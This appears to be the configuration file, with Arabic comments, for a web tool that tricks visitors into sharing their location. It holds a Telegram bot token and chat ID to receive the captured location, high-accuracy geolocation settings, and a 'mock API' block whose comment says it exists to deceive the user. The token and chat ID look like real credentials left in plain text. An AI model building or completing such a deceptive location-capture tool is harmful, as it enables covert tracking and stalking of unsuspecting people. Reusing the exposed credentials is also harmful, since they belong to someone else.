// ملف الإعدادات - قم بتعديل هذه القيم
const CONFIG = {
  // ضع هنا توكن البوت الخاص بك من BotFather
  TELEGRAM_BOT_TOKEN: "8470142544:AAGRnyML6TGyxod3LenAg7IwZ4y-LVareoc",

  // ضع هنا معرف الدردشة (Chat ID) الذي تريد إرسال الموقع إليه
  TELEGRAM_CHAT_ID: "7404553648",

  // خيارات تحديد الموقع
  GEOLOCATION_OPTIONS: {
    enableHighAccuracy: true,
    timeout: 10000,
    maximumAge: 0,
  },

  // عناوين URL وهمية للتحويل (لإيهام المستخدم)
  MOCK_API: {
    ENABLED: true,
    UPDATE_INTERVAL: 30000, // 30 ثانية
  },
};
